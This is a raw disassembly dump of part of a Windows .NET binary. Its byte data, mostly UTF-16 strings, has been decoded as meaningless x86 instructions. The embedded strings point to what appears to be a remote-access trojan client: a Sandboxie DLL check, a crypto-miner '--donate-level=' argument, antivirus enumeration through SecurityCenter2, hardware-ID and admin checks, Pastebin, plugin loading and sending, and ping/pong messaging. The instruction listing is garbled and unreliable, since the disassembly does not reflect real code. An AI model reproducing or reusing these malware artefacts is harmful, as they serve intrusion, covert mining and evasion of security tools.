  40b5b7:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b5bb:	00 6f 00             	add    %ch,0x0(%edi)
  40b5be:	78 00                	js     0x40b5c0
  40b5c0:	00 17                	add    %dl,(%edi)
  40b5c2:	53                   	push   %ebx
  40b5c3:	00 62 00             	add    %ah,0x0(%edx)
  40b5c6:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b5cc:	6c                   	insb   (%dx),%es:(%edi)
  40b5cd:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b5d1:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b5d5:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b5d9:	1f                   	pop    %ds
  40b5da:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40b5df:	00 6f 00             	add    %ch,0x0(%edi)
  40b5e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5e3:	00 61 00             	add    %ah,0x0(%ecx)
  40b5e6:	74 00                	je     0x40b5e8
  40b5e8:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  40b5ef:	00 76 00             	add    %dh,0x0(%esi)
  40b5f2:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  40b5f7:	00 01                	add    %al,(%ecx)
  40b5f9:	03 31                	add    (%ecx),%esi
  40b5fb:	00 00                	add    %al,(%eax)
  40b5fd:	71 53                	jno    0x40b652
  40b5ff:	00 45 00             	add    %al,0x0(%ebp)
  40b602:	4c                   	dec    %esp
  40b603:	00 45 00             	add    %al,0x0(%ebp)
  40b606:	43                   	inc    %ebx
  40b607:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40b60b:	00 43 00             	add    %al,0x0(%ebx)
  40b60e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b60f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b612:	6d                   	insl   (%dx),%es:(%edi)
  40b613:	00 61 00             	add    %ah,0x0(%ecx)
  40b616:	6e                   	outsb  %ds:(%esi),(%dx)
  40b617:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b61b:	00 69 00             	add    %ch,0x0(%ecx)
  40b61e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b61f:	00 65 00             	add    %ah,0x0(%ebp)
  40b622:	20 00                	and    %al,(%eax)
  40b624:	46                   	inc    %esi
  40b625:	00 52 00             	add    %dl,0x0(%edx)
  40b628:	4f                   	dec    %edi
  40b629:	00 4d 00             	add    %cl,0x0(%ebp)
  40b62c:	20 00                	and    %al,(%eax)
  40b62e:	57                   	push   %edi
  40b62f:	00 69 00             	add    %ch,0x0(%ecx)
  40b632:	6e                   	outsb  %ds:(%esi),(%dx)
  40b633:	00 33                	add    %dh,(%ebx)
  40b635:	00 32                	add    %dh,(%edx)
  40b637:	00 5f 00             	add    %bl,0x0(%edi)
  40b63a:	50                   	push   %eax
  40b63b:	00 72 00             	add    %dh,0x0(%edx)
  40b63e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b63f:	00 63 00             	add    %ah,0x0(%ebx)
  40b642:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b646:	73 00                	jae    0x40b648
  40b648:	20 00                	and    %al,(%eax)
  40b64a:	57                   	push   %edi
  40b64b:	00 48 00             	add    %cl,0x0(%eax)
  40b64e:	45                   	inc    %ebp
  40b64f:	00 52 00             	add    %dl,0x0(%edx)
  40b652:	45                   	inc    %ebp
  40b653:	00 20                	add    %ah,(%eax)
  40b655:	00 50 00             	add    %dl,0x0(%eax)
  40b658:	72 00                	jb     0x40b65a
  40b65a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b65b:	00 63 00             	add    %ah,0x0(%ebx)
  40b65e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b662:	73 00                	jae    0x40b664
  40b664:	49                   	dec    %ecx
  40b665:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40b669:	00 3d 00 20 00 00    	add    %bh,0x2000
  40b66f:	17                   	pop    %ss
  40b670:	43                   	inc    %ebx
  40b671:	00 6f 00             	add    %ch,0x0(%edi)
  40b674:	6d                   	insl   (%dx),%es:(%edi)
  40b675:	00 6d 00             	add    %ch,0x0(%ebp)
  40b678:	61                   	popa
  40b679:	00 6e 00             	add    %ch,0x0(%esi)
  40b67c:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40b681:	00 6e 00             	add    %ch,0x0(%esi)
  40b684:	65 00 00             	add    %al,%gs:(%eax)
  40b687:	11 45 00             	adc    %eax,0x0(%ebp)
  40b68a:	72 00                	jb     0x40b68c
  40b68c:	72 00                	jb     0x40b68e
  40b68e:	20 00                	and    %al,(%eax)
  40b690:	48                   	dec    %eax
  40b691:	00 57 00             	add    %dl,0x0(%edi)
  40b694:	49                   	dec    %ecx
  40b695:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b699:	05 78 00 32 00       	add    $0x320078,%eax
  40b69e:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b6a4:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b6aa:	74 00                	je     0x40b6ac
  40b6ac:	49                   	dec    %ecx
  40b6ad:	00 6e 00             	add    %ch,0x0(%esi)
  40b6b0:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b6b4:	00 09                	add    %cl,(%ecx)
  40b6b6:	48                   	dec    %eax
  40b6b7:	00 57 00             	add    %dl,0x0(%edi)
  40b6ba:	49                   	dec    %ecx
  40b6bb:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b6bf:	09 55 00             	or     %edx,0x0(%ebp)
  40b6c2:	73 00                	jae    0x40b6c4
  40b6c4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b6c8:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b6ce:	00 13                	add    %dl,(%ebx)
  40b6d0:	4d                   	dec    %ebp
  40b6d1:	00 69 00             	add    %ch,0x0(%ecx)
  40b6d4:	63 00                	arpl   %eax,(%eax)
  40b6d6:	72 00                	jb     0x40b6d8
  40b6d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6d9:	00 73 00             	add    %dh,0x0(%ebx)
  40b6dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6dd:	00 66 00             	add    %ah,0x0(%esi)
  40b6e0:	74 00                	je     0x40b6e2
  40b6e2:	00 03                	add    %al,(%ebx)
  40b6e4:	20 00                	and    %al,(%eax)
  40b6e6:	00 09                	add    %cl,(%ecx)
  40b6e8:	54                   	push   %esp
  40b6e9:	00 72 00             	add    %dh,0x0(%edx)
  40b6ec:	75 00                	jne    0x40b6ee
  40b6ee:	65 00 00             	add    %al,%gs:(%eax)
  40b6f1:	0b 36                	or     (%esi),%esi
  40b6f3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6f6:	62 00                	bound  %eax,(%eax)
  40b6f8:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40b6fe:	46                   	inc    %esi
  40b6ff:	00 61 00             	add    %ah,0x0(%ecx)
  40b702:	6c                   	insb   (%dx),%es:(%edi)
  40b703:	00 73 00             	add    %dh,0x0(%ebx)
  40b706:	65 00 00             	add    %al,%gs:(%eax)
  40b709:	0b 33                	or     (%ebx),%esi
  40b70b:	00 32                	add    %dh,(%edx)
  40b70d:	00 62 00             	add    %ah,0x0(%edx)
  40b710:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40b716:	50                   	push   %eax
  40b717:	00 61 00             	add    %ah,0x0(%ecx)
  40b71a:	74 00                	je     0x40b71c
  40b71c:	68 00 00 0f 56       	push   $0x560f0000
  40b721:	00 65 00             	add    %ah,0x0(%ebp)
  40b724:	72 00                	jb     0x40b726
  40b726:	73 00                	jae    0x40b728
  40b728:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b72e:	00 0b                	add    %cl,(%ebx)
  40b730:	41                   	inc    %ecx
  40b731:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b735:	00 69 00             	add    %ch,0x0(%ecx)
  40b738:	6e                   	outsb  %ds:(%esi),(%dx)
  40b739:	00 00                	add    %al,(%eax)
  40b73b:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40b73f:	00 75 00             	add    %dh,0x0(%ebp)
  40b742:	65 00 00             	add    %al,%gs:(%eax)
  40b745:	0b 66 00             	or     0x0(%esi),%esp
  40b748:	61                   	popa
  40b749:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40b74d:	00 65 00             	add    %ah,0x0(%ebp)
  40b750:	00 17                	add    %dl,(%edi)
  40b752:	50                   	push   %eax
  40b753:	00 65 00             	add    %ah,0x0(%ebp)
  40b756:	72 00                	jb     0x40b758
  40b758:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b75c:	72 00                	jb     0x40b75e
  40b75e:	6d                   	insl   (%dx),%es:(%edi)
  40b75f:	00 61 00             	add    %ah,0x0(%ecx)
  40b762:	6e                   	outsb  %ds:(%esi),(%dx)
  40b763:	00 63 00             	add    %ah,0x0(%ebx)
  40b766:	65 00 00             	add    %al,%gs:(%eax)
  40b769:	11 50 00             	adc    %edx,0x0(%eax)
  40b76c:	61                   	popa
  40b76d:	00 73 00             	add    %dh,0x0(%ebx)
  40b770:	74 00                	je     0x40b772
  40b772:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40b776:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40b77c:	41                   	inc    %ecx
  40b77d:	00 6e 00             	add    %ch,0x0(%esi)
  40b780:	74 00                	je     0x40b782
  40b782:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40b788:	72 00                	jb     0x40b78a
  40b78a:	75 00                	jne    0x40b78c
  40b78c:	73 00                	jae    0x40b78e
  40b78e:	00 13                	add    %dl,(%ebx)
  40b790:	49                   	dec    %ecx
  40b791:	00 6e 00             	add    %ch,0x0(%esi)
  40b794:	73 00                	jae    0x40b796
  40b796:	74 00                	je     0x40b798
  40b798:	61                   	popa
  40b799:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b79d:	00 65 00             	add    %ah,0x0(%ebp)
  40b7a0:	64 00 00             	add    %al,%fs:(%eax)
  40b7a3:	09 50 00             	or     %edx,0x0(%eax)
  40b7a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7a7:	00 6e 00             	add    %ch,0x0(%esi)
  40b7aa:	67 00 00             	add    %al,(%bx,%si)
  40b7ad:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40b7b2:	00 2b                	add    %ch,(%ebx)
  40b7b4:	5c                   	pop    %esp
  40b7b5:	00 72 00             	add    %dh,0x0(%edx)
  40b7b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7b9:	00 6f 00             	add    %ch,0x0(%edi)
  40b7bc:	74 00                	je     0x40b7be
  40b7be:	5c                   	pop    %esp
  40b7bf:	00 53 00             	add    %dl,0x0(%ebx)
  40b7c2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b7c6:	75 00                	jne    0x40b7c8
  40b7c8:	72 00                	jb     0x40b7ca
  40b7ca:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40b7d0:	43                   	inc    %ebx
  40b7d1:	00 65 00             	add    %ah,0x0(%ebp)
  40b7d4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7d5:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b7d9:	00 72 00             	add    %dh,0x0(%edx)
  40b7dc:	32 00                	xor    (%eax),%al
  40b7de:	00 3d 53 00 65 00    	add    %bh,0x650053
  40b7e4:	6c                   	insb   (%dx),%es:(%edi)
  40b7e5:	00 65 00             	add    %ah,0x0(%ebp)
  40b7e8:	63 00                	arpl   %eax,(%eax)
  40b7ea:	74 00                	je     0x40b7ec
  40b7ec:	20 00                	and    %al,(%eax)
  40b7ee:	2a 00                	sub    (%eax),%al
  40b7f0:	20 00                	and    %al,(%eax)
  40b7f2:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b7f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7f7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b7fa:	20 00                	and    %al,(%eax)
  40b7fc:	41                   	inc    %ecx
  40b7fd:	00 6e 00             	add    %ch,0x0(%esi)
  40b800:	74 00                	je     0x40b802
  40b802:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40b808:	72 00                	jb     0x40b80a
  40b80a:	75 00                	jne    0x40b80c
  40b80c:	73 00                	jae    0x40b80e
  40b80e:	50                   	push   %eax
  40b80f:	00 72 00             	add    %dh,0x0(%edx)
  40b812:	6f                   	outsl  %ds:(%esi),(%dx)
  40b813:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b817:	00 63 00             	add    %ah,0x0(%ebx)
  40b81a:	74 00                	je     0x40b81c
  40b81c:	00 17                	add    %dl,(%edi)
  40b81e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40b822:	73 00                	jae    0x40b824
  40b824:	70 00                	jo     0x40b826
  40b826:	6c                   	insb   (%dx),%es:(%edi)
  40b827:	00 61 00             	add    %ah,0x0(%ecx)
  40b82a:	79 00                	jns    0x40b82c
  40b82c:	4e                   	dec    %esi
  40b82d:	00 61 00             	add    %ah,0x0(%ecx)
  40b830:	6d                   	insl   (%dx),%es:(%edi)
  40b831:	00 65 00             	add    %ah,0x0(%ebp)
  40b834:	00 07                	add    %al,(%edi)
  40b836:	4e                   	dec    %esi
  40b837:	00 2f                	add    %ch,(%edi)
  40b839:	00 41 00             	add    %al,0x0(%ecx)
  40b83c:	00 05 2c 00 20 00    	add    %al,0x20002c
  40b842:	00 13                	add    %dl,(%ebx)
  40b844:	53                   	push   %ebx
  40b845:	00 6f 00             	add    %ch,0x0(%edi)
  40b848:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40b84d:	00 61 00             	add    %ah,0x0(%ecx)
  40b850:	72 00                	jb     0x40b852
  40b852:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40b857:	09 70 00             	or     %esi,0x0(%eax)
  40b85a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b85b:	00 6e 00             	add    %ch,0x0(%esi)
  40b85e:	67 00 00             	add    %al,(%bx,%si)
  40b861:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40b866:	75 00                	jne    0x40b868
  40b868:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b86c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b86d:	00 00                	add    %al,(%eax)
  40b86f:	15 73 00 61 00       	adc    $0x610073,%eax
  40b874:	76 00                	jbe    0x40b876
  40b876:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b87a:	6c                   	insb   (%dx),%es:(%edi)
  40b87b:	00 75 00             	add    %dh,0x0(%ebp)
  40b87e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b882:	6e                   	outsb  %ds:(%esi),(%dx)
  40b883:	00 00                	add    %al,(%eax)
  40b885:	07                   	pop    %es
  40b886:	44                   	inc    %esp
  40b887:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b88b:	00 00                	add    %al,(%eax)
  40b88d:	15 73 00 65 00       	adc    $0x650073,%eax
  40b892:	6e                   	outsb  %ds:(%esi),(%dx)
  40b893:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b897:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b89b:	00 67 00             	add    %ah,0x0(%edi)
  40b89e:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40b8a4:	48                   	dec    %eax
  40b8a5:	00 61 00             	add    %ah,0x0(%ecx)
  40b8a8:	73 00                	jae    0x40b8aa
  40b8aa:	68 00 65 00 73       	push   $0x73006500
  40b8af:	00 00                	add    %al,(%eax)
  40b8b1:	09 48 00             	or     %ecx,0x0(%eax)
  40b8b4:	61                   	popa
  40b8b5:	00 73 00             	add    %dh,0x0(%ebx)
  40b8b8:	68 00 00 1b 50       	push   $0x501b0000
  40b8bd:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b8c1:	00 67 00             	add    %ah,0x0(%edi)
  40b8c4:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b8ca:	50                   	push   %eax
  40b8cb:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b8cf:	00 67 00             	add    %ah,0x0(%edi)
  40b8d2:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40b8d8:	52                   	push   %edx
  40b8d9:	00 75 00             	add    %dh,0x0(%ebp)
  40b8dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8dd:	00 00                	add    %al,(%eax)
  40b8df:	0f 4d 00             	cmovge (%eax),%eax
  40b8e2:	73 00                	jae    0x40b8e4
  40b8e4:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40b8e8:	61                   	popa
  40b8e9:	00 63 00             	add    %ah,0x0(%ebx)
  40b8ec:	6b 00 00             	imul   $0x0,(%eax),%eax
  40b8ef:	11 52 00             	adc    %edx,0x0(%edx)
  40b8f2:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b8f6:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40b8fa:	76 00                	jbe    0x40b8fc
  40b8fc:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40b901:	0b 45 00             	or     0x0(%ebp),%eax
  40b904:	72 00                	jb     0x40b906
  40b906:	72 00                	jb     0x40b908
  40b908:	6f                   	outsl  %ds:(%esi),(%dx)
  40b909:	00 72 00             	add    %dh,0x0(%edx)
  40b90c:	00 47 6d             	add    %al,0x6d(%edi)
  40b90f:	00 61 00             	add    %ah,0x0(%ecx)
  40b912:	73 00                	jae    0x40b914
  40b914:	74 00                	je     0x40b916
  40b916:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b91a:	4b                   	dec    %ebx
  40b91b:	00 65 00             	add    %ah,0x0(%ebp)
  40b91e:	79 00                	jns    0x40b920
  40b920:	20 00                	and    %al,(%eax)
  40b922:	63 00                	arpl   %eax,(%eax)
  40b924:	61                   	popa
  40b925:	00 6e 00             	add    %ch,0x0(%esi)
  40b928:	20 00                	and    %al,(%eax)
  40b92a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b92b:	00 6f 00             	add    %ch,0x0(%edi)
  40b92e:	74 00                	je     0x40b930
  40b930:	20 00                	and    %al,(%eax)
  40b932:	62 00                	bound  %eax,(%eax)
  40b934:	65 00 20             	add    %ah,%gs:(%eax)
  40b937:	00 6e 00             	add    %ch,0x0(%esi)
  40b93a:	75 00                	jne    0x40b93c
  40b93c:	6c                   	insb   (%dx),%es:(%edi)
  40b93d:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40b941:	00 6f 00             	add    %ch,0x0(%edi)
  40b944:	72 00                	jb     0x40b946
  40b946:	20 00                	and    %al,(%eax)
  40b948:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b94c:	70 00                	jo     0x40b94e
  40b94e:	74 00                	je     0x40b950
  40b950:	79 00                	jns    0x40b952
  40b952:	2e 00 00             	add    %al,%cs:(%eax)
  40b955:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40b95a:	70 00                	jo     0x40b95c
  40b95c:	75 00                	jne    0x40b95e
  40b95e:	74 00                	je     0x40b960
  40b960:	20 00                	and    %al,(%eax)
  40b962:	63 00                	arpl   %eax,(%eax)
  40b964:	61                   	popa
  40b965:	00 6e 00             	add    %ch,0x0(%esi)
  40b968:	20 00                	and    %al,(%eax)
  40b96a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b96b:	00 6f 00             	add    %ch,0x0(%edi)
  40b96e:	74 00                	je     0x40b970
  40b970:	20 00                	and    %al,(%eax)
  40b972:	62 00                	bound  %eax,(%eax)
  40b974:	65 00 20             	add    %ah,%gs:(%eax)
  40b977:	00 6e 00             	add    %ch,0x0(%esi)
  40b97a:	75 00                	jne    0x40b97c
  40b97c:	6c                   	insb   (%dx),%es:(%edi)
  40b97d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b981:	00 00                	add    %al,(%eax)
  40b983:	55                   	push   %ebp
  40b984:	49                   	dec    %ecx
  40b985:	00 6e 00             	add    %ch,0x0(%esi)
  40b988:	76 00                	jbe    0x40b98a
  40b98a:	61                   	popa
  40b98b:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b98f:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40b993:	00 6d 00             	add    %ch,0x0(%ebp)
  40b996:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b99a:	73 00                	jae    0x40b99c
  40b99c:	61                   	popa
  40b99d:	00 67 00             	add    %ah,0x0(%edi)
  40b9a0:	65 00 20             	add    %ah,%gs:(%eax)
  40b9a3:	00 61 00             	add    %ah,0x0(%ecx)
  40b9a6:	75 00                	jne    0x40b9a8
  40b9a8:	74 00                	je     0x40b9aa
  40b9aa:	68 00 65 00 6e       	push   $0x6e006500
  40b9af:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b9b3:	00 63 00             	add    %ah,0x0(%ebx)
  40b9b6:	61                   	popa
  40b9b7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b9bb:	00 6f 00             	add    %ch,0x0(%edi)
  40b9be:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9bf:	00 20                	add    %ah,(%eax)
  40b9c1:	00 63 00             	add    %ah,0x0(%ebx)
  40b9c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9c5:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b9c9:	00 20                	add    %ah,(%eax)
  40b9cb:	00 28                	add    %ch,(%eax)
  40b9cd:	00 4d 00             	add    %cl,0x0(%ebp)
  40b9d0:	41                   	inc    %ecx
  40b9d1:	00 43 00             	add    %al,0x0(%ebx)
  40b9d4:	29 00                	sub    %eax,(%eax)
  40b9d6:	2e 00 00             	add    %al,%cs:(%eax)
  40b9d9:	05 58 00 32 00       	add    $0x320058,%eax
  40b9de:	00 00                	add    %al,(%eax)
  40b9e0:	36 9d                	ss popf
  40b9e2:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  40b9e9:	eb 5b                	jmp    0x40ba46
  40b9eb:	54                   	push   %esp
  40b9ec:	8a a7 3f 24 00 08    	mov    0x800243f(%edi),%ah
  40b9f2:	b7 7a                	mov    $0x7a,%bh
  40b9f4:	5c                   	pop    %esp
  40b9f5:	56                   	push   %esi
  40b9f6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40b9f9:	89 03                	mov    %eax,(%ebx)
  40b9fb:	00 00                	add    %al,(%eax)
  40b9fd:	01 03                	add    %eax,(%ebx)
  40b9ff:	20 00                	and    %al,(%eax)
  40ba01:	01 02                	add    %eax,(%edx)
  40ba03:	06                   	push   %es
  40ba04:	0e                   	push   %cs
  40ba05:	03 06                	add    (%esi),%eax
  40ba07:	12 09                	adc    (%ecx),%cl
  40ba09:	03 06                	add    (%esi),%eax
  40ba0b:	12 60 03             	adc    0x3(%eax),%ah
  40ba0e:	00 00                	add    %al,(%eax)
  40ba10:	02 03                	add    (%ebx),%al
  40ba12:	06                   	push   %es
  40ba13:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40ba19:	03 06                	add    (%esi),%eax
  40ba1b:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40ba20:	03 06                	add    (%esi),%eax
  40ba22:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40ba28:	06                   	push   %es
  40ba29:	1c 02                	sbb    $0x2,%al
  40ba2b:	06                   	push   %es
  40ba2c:	08 04 00             	or     %al,(%eax,%eax,1)
  40ba2f:	00 12                	add    %dl,(%edx)
  40ba31:	0d 05 00 01 01       	or     $0x1010005,%eax
  40ba36:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40ba3c:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40ba42:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40ba45:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40ba4b:	01 1d 05 03 00 00    	add    %ebx,0x305
  40ba51:	0a 04 00             	or     (%eax,%eax,1),%al
  40ba54:	01 01                	add    %eax,(%ecx)
  40ba56:	0a 04 00             	or     (%eax,%eax,1),%al
  40ba59:	00 12                	add    %dl,(%edx)
  40ba5b:	15 05 00 01 01       	adc    $0x1010005,%eax
  40ba60:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40ba66:	02 03                	add    (%ebx),%al
  40ba68:	00 00                	add    %al,(%eax)
  40ba6a:	1c 03                	sbb    $0x3,%al
  40ba6c:	00 00                	add    %al,(%eax)
  40ba6e:	08 04 00             	or     %al,(%eax,%eax,1)
  40ba71:	01 01                	add    %eax,(%ecx)
  40ba73:	08 04 00             	or     %al,(%eax,%eax,1)
  40ba76:	01 02                	add    %eax,(%edx)
  40ba78:	0e                   	push   %cs
  40ba79:	0a 00                	or     (%eax),%al
  40ba7b:	04 02                	add    $0x2,%al
  40ba7d:	1c 12                	sbb    $0x12,%al
  40ba7f:	19 12                	sbb    %edx,(%edx)
  40ba81:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40ba86:	01 01                	add    %eax,(%ecx)
  40ba88:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40ba8e:	1c 04                	sbb    $0x4,%al
  40ba90:	08 00                	or     %al,(%eax)
  40ba92:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40ba98:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40ba9b:	00 1d 05 03 08 00    	add    %bl,0x80305
  40baa1:	0a 04 08             	or     (%eax,%ecx,1),%al
  40baa4:	00 12                	add    %dl,(%edx)
  40baa6:	15 03 08 00 02       	adc    $0x2000803,%eax
  40baab:	03 08                	add    (%eax),%ecx
  40baad:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bab0:	08 00                	or     %al,(%eax)
  40bab2:	08 03                	or     %al,(%ebx)
  40bab4:	06                   	push   %es
  40bab5:	12 29                	adc    (%ecx),%ch
  40bab7:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40babc:	0e                   	push   %cs
  40babd:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40bac2:	05 06 00 01 1d       	add    $0x1d010006,%eax
  40bac7:	05 1d 05 05 00       	add    $0x5051d,%eax
  40bacc:	01 1d 05 0a 05 00    	add    %ebx,0x50a05
  40bad2:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bad8:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bade:	01 1d 05 0d 07 06    	add    %ebx,0x6070d05
  40bae4:	15 12 31 01 12       	adc    $0x12013112,%eax
  40bae9:	20 09                	and    %cl,(%ecx)
  40baeb:	20 01                	and    %al,(%ecx)
  40baed:	01 15 12 31 01 12    	add    %edx,0x12013112
  40baf3:	20 03                	and    %al,(%ebx)
  40baf5:	20 00                	and    %al,(%eax)
  40baf7:	1c 03                	sbb    $0x3,%al
  40baf9:	20 00                	and    %al,(%eax)
  40bafb:	02 03                	add    (%ebx),%al
  40bafd:	28 00                	sub    %al,(%eax)
  40baff:	1c 03                	sbb    $0x3,%al
  40bb01:	06                   	push   %es
  40bb02:	12 20                	adc    (%eax),%ah
  40bb04:	0b 20                	or     (%eax),%esp
  40bb06:	02 01                	add    (%ecx),%al
  40bb08:	12 20                	adc    (%eax),%ah
  40bb0a:	15 12 31 01 12       	adc    $0x12013112,%eax
  40bb0f:	20 04 20             	and    %al,(%eax,%eiz,1)
  40bb12:	00 12                	add    %dl,(%edx)
  40bb14:	20 05 20 01 12 20    	and    %al,0x20120120
  40bb1a:	0e                   	push   %cs
  40bb1b:	05 20 01 12 20       	add    $0x20120120,%eax
  40bb20:	0a 05 20 01 12 20    	or     0x20120120,%al
  40bb26:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bb2b:	20 08                	and    %cl,(%eax)
  40bb2d:	03 20                	add    (%eax),%esp
  40bb2f:	00 08                	add    %cl,(%eax)
  40bb31:	05 28 01 12 20       	add    $0x20120128,%eax
  40bb36:	08 03                	or     %al,(%ebx)
  40bb38:	28 00                	sub    %al,(%eax)
  40bb3a:	08 03                	or     %al,(%ebx)
  40bb3c:	06                   	push   %es
  40bb3d:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40bb40:	06                   	push   %es
  40bb41:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40bb44:	20 01                	and    %al,(%ecx)
  40bb46:	01 0e                	add    %ecx,(%esi)
  40bb48:	04 20                	add    $0x20,%al
  40bb4a:	01 08                	add    %ecx,(%eax)
  40bb4c:	0e                   	push   %cs
  40bb4d:	05 20 01 01 12       	add    $0x12010120,%eax
  40bb52:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40bb55:	01 01                	add    %eax,(%ecx)
  40bb57:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bb5a:	01 01                	add    %eax,(%ecx)
  40bb5c:	0b 03                	or     (%ebx),%eax
  40bb5e:	20 00                	and    %al,(%eax)
  40bb60:	0b 03                	or     (%ebx),%eax
  40bb62:	20 00                	and    %al,(%eax)
  40bb64:	0a 03                	or     (%ebx),%al
  40bb66:	20 00                	and    %al,(%eax)
  40bb68:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bb6d:	1d 05 04 20 00       	sbb    $0x200405,%eax
